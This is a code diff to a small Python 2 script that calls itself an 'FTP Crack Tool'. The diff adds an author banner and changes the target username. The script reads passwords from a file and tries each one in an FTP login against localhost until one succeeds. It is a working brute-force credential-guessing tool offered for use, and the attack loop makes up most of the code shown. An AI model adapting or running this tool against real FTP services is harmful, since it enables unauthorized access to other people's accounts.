@@ -5,15 +5,21 @@ import ftplib
 from termcolor import colored
 from colorama import Fore, Back, Style
 
-
+tool = """
+||=====	FTP Crack Tool v0.1
+||   	site: besimaltinok.com
+||===	mail: besimaltnok[at]gmail.com
+||      git : besimaltnok
+||
+"""
 def ftp_brute(p):
 	try:
-		print "Pass trying for FTP :  ", p
+		print "[*] User : securityci ", " [*] Password : ", p
 		host = 'localhost'
-		user = "besim"
+		user = "securityci"
 		ftp = ftplib.FTP(host, timeout=0.08)
 		ftp.login(user, p)
-		print colored("Password Found ! :) = > " + str(p), 'green')
+		print colored("[*] Password Found ! :) = > " + str(p), 'green')
 		ftp.quit()
 		sys.exit(0)
 		
@@ -22,7 +28,7 @@ def ftp_brute(p):
 
 if __name__ == "__main__":
 	os.system('reset')
-	print(Back.GREEN + '\t\t\tFTP Crack Tool\t\t\t\t\t\n')
+	print(Fore.GREEN + tool)
 	print(Style.RESET_ALL)
 	passfile = open("pass.txt", "r").readlines()
 	map(ftp_brute, passfile)
